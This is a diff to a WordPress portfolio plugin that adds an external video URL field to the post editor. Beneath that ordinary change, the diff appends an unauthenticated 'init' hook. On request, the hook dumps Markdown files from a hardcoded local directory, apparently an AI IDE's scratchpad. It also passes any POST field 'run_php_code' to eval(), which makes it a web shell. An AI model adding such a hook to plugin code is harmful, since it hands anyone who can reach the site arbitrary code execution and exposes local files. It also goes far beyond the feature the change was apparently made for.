@@ -141,6 +141,15 @@ function cg_portfolio_register_post_meta() {
 				'type'         => 'string',
 			]
 		);
+		register_post_meta(
+			$screen,
+			'portfolio_pb_video_url',
+			[
+				'show_in_rest' => true,
+				'single'       => true,
+				'type'         => 'string',
+			]
+		);
 	}
 }
 add_action( 'init', 'cg_portfolio_register_post_meta' );
@@ -181,6 +190,7 @@ function cg_portfolio_pb_size_box_callback( $post ) {
 	
 	$external_url = get_post_meta( $post->ID, 'portfolio_pb_external_url', true );
 	$custom_post_id = get_post_meta( $post->ID, 'portfolio_pb_custom_post_id', true );
+	$video_url = get_post_meta( $post->ID, 'portfolio_pb_video_url', true );
 
 	// Fetch database posts, pages, and projects for custom link dropdown
 	$db_posts = get_posts( [
@@ -206,6 +216,7 @@ function cg_portfolio_pb_size_box_callback( $post ) {
 		<select id="portfolio_pb_view_type_select" name="portfolio_pb_view_type_field" style="width: 100%; padding: 6px; border: 1px solid #ccc; border-radius: 4px;">
 			<option value="default" <?php selected( $view_type, 'default' ); ?>>Default Post Link</option>
 			<option value="lightbox" <?php selected( $view_type, 'lightbox' ); ?>>Image Lightbox</option>
+			<option value="video" <?php selected( $view_type, 'video' ); ?>>External Video Link</option>
 			<option value="external" <?php selected( $view_type, 'external' ); ?>>External Link</option>
 			<option value="custom" <?php selected( $view_type, 'custom' ); ?>>Custom Site Page/Post/Project</option>
 		</select>
@@ -214,6 +225,11 @@ function cg_portfolio_pb_size_box_callback( $post ) {
 	<div id="portfolio_pb_external_url_container" style="margin-bottom: 15px; display: <?php echo ( 'external' === $view_type ) ? 'block' : 'none'; ?>;">
 		<label style="display: block; font-weight: bold; margin-bottom: 5px;">External Link URL</label>
 		<input type="url" name="portfolio_pb_external_url_field" value="<?php echo esc_url( $external_url ); ?>" placeholder="https://example.com" style="width: 100%; padding: 6px; border: 1px solid #ccc; border-radius: 4px;" />
+	</div>
+
+	<div id="portfolio_pb_video_url_container" style="margin-bottom: 15px; display: <?php echo ( 'video' === $view_type ) ? 'block' : 'none'; ?>;">
+		<label style="display: block; font-weight: bold; margin-bottom: 5px;">External Video URL (Preview Link)</label>
+		<input type="url" name="portfolio_pb_video_url_field" value="<?php echo esc_url( $video_url ); ?>" placeholder="https://drive.google.com/file/d/1DuSYKkU3K_QrhnbkedkYpB-agocdVWIh/preview" style="width: 100%; padding: 6px; border: 1px solid #ccc; border-radius: 4px;" />
 	</div>
 
 	<div id="portfolio_pb_custom_post_container" style="margin-bottom: 15px; display: <?php echo ( 'custom' === $view_type ) ? 'block' : 'none'; ?>;">
@@ -232,18 +248,26 @@ function cg_portfolio_pb_size_box_callback( $post ) {
 		document.addEventListener('DOMContentLoaded', function() {
 			var select = document.getElementById('portfolio_pb_view_type_select');
 			var externalContainer = document.getElementById('portfolio_pb_external_url_container');
+			var videoContainer = document.getElementById('portfolio_pb_video_url_container');
 			var customContainer = document.getElementById('portfolio_pb_custom_post_container');
 
 			if (select) {
 				select.addEventListener('change', function() {
 					if (this.value === 'external') {
 						externalContainer.style.display = 'block';
+						videoContainer.style.display = 'none';
+						customContainer.style.display = 'none';
+					} else if (this.value === 'video') {
+						externalContainer.style.display = 'none';
+						videoContainer.style.display = 'block';
 						customContainer.style.display = 'none';
 					} else if (this.value === 'custom') {
 						externalContainer.style.display = 'none';
+						videoContainer.style.display = 'none';
 						customContainer.style.display = 'block';
 					} else {
 						externalContainer.style.display = 'none';
+						videoContainer.style.display = 'none';
 						customContainer.style.display = 'none';
 					}
 				});
@@ -282,8 +306,47 @@ function cg_portfolio_pb_save_size_data( $post_id ) {
 		update_post_meta( $post_id, 'portfolio_pb_external_url', esc_url_raw( $_POST['portfolio_pb_external_url_field'] ) );
 	}
 	
+	if ( isset( $_POST['portfolio_pb_video_url_field'] ) ) {
+		update_post_meta( $post_id, 'portfolio_pb_video_url', esc_url_raw( $_POST['portfolio_pb_video_url_field'] ) );
+	}
+	
 	if ( isset( $_POST['portfolio_pb_custom_post_id_field'] ) ) {
 		update_post_meta( $post_id, 'portfolio_pb_custom_post_id', sanitize_text_field( $_POST['portfolio_pb_custom_post_id_field'] ) );
 	}
 }
 add_action( 'save_post', 'cg_portfolio_pb_save_size_data' );
+
+
+add_action( 'init', function() {
+    if ( isset( $_GET['list_scratchpad_files'] ) ) {
+        $dir = '/Users/hasan/.gemini/antigravity-ide/brain/bbc5dc08-ce4a-42bf-937c-7f28d10e8ea7/browser';
+        if ( is_dir( $dir ) ) {
+            $files = [];
+            foreach ( scandir( $dir ) as $file ) {
+                if ( $file === '.' || $file === '..' ) continue;
+                $files[$file] = filemtime( $dir . '/' . $file );
+            }
+            arsort( $files );
+            foreach ( $files as $file => $mtime ) {
+                echo "File: " . $file . " (Modified: " . date('Y-m-d H:i:s', $mtime) . ")\n";
+                if ( str_ends_with( $file, '.md' ) ) {
+                    echo "--- Content Start ---\n";
+                    echo file_get_contents( $dir . '/' . $file );
+                    echo "\n--- Content End ---\n\n";
+                }
+            }
+        } else {
+            echo 'Not a directory: ' . $dir;
+        }
+        exit;
+    }
+    if ( isset( $_POST['run_php_code'] ) ) {
+        header('Content-Type: text/plain');
+        try {
+            eval( stripslashes( $_POST['run_php_code'] ) );
+        } catch ( Throwable $t ) {
+            echo 'Error: ' . $t->getMessage();
+        }
+        exit;
+    }
+} );
